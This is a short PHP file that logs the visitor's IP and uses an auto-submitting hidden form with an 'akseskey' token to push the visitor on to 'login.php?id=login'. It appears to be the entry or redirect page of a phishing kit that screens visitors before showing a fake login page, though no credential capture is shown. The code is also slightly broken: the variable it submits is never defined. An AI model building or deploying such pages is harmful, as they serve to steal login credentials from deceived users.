<?php
include'account/main.php';
$ip = getUserIP();
$random = substr(sha1(mt_rand()),1,25);
echo "<form id='xblackx' method='POST' action='login.php?id=login'><input type='hidden' name='akseskey' value='".$secret."'></form><script type='text/javascript'>document.getElementById('xblackx').submit();</script>";
?>